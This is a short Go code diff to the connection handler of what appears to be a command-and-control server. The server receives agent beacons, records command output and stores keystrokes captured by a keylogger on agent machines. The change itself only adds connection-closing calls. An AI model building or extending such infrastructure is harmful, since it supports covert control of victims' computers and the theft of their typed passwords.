@@ -36,6 +36,7 @@ func IsValidUUID(u string) bool {
 
 func handleconn(connection net.Conn) {
 	for {
+
 		text, _ := bufio.NewReader(connection).ReadString('\n')
 		message := strings.Split(text, "\n")
 		// fmt.Println(message[0])
@@ -83,9 +84,11 @@ func handleconn(connection net.Conn) {
 
 							if destruct.Result == "2" {
 								logger.Logf(logger.Debug, "Agent %s Sent Nothing Back\n", uid)
+								connection.Close()
 							} else {
 								logger.Logf(logger.Debug, "Agent %s Sent Back: %s\n", uid, destruct.Output)
 								data.UpdateAgentCommand(destruct.CommandUUID, destruct.Output, fetch.Uuid)
+								connection.Close()
 							}
 						} else if keyOrNot == "KeysBeacon" { // Handle keylog response
 
@@ -103,21 +106,27 @@ func handleconn(connection net.Conn) {
 							if destruct.Keys != "" {
 								logger.Logf(logger.Debug, "Agent %s with keys: %s\n", uid, destruct.Keys)
 								data.UpdateAgentKeys(uid, destruct.Keys)
+								connection.Close()
 							} else {
 								logger.Logf(logger.Debug, "Agent %s Sent Back No Keys\n", uid)
+								connection.Close()
 							}
 						} else {
 							logger.Logf(logger.Info, "Unknown Beacon Type\n")
+							connection.Close()
 						}
 					} else {
 						// agent not in database!!!
 						logger.Logf(logger.Info, "Unknown Agent, Wrong Key\n")
+						connection.Close()
 					}
 				} else {
 					logger.Logf(logger.Info, "Invalid UUID\n")
+					connection.Close()
 				}
 			} else {
 				logger.Logf(logger.Info, "Wrong blob count\n")
+				connection.Close()
 			}
 		}
 	}
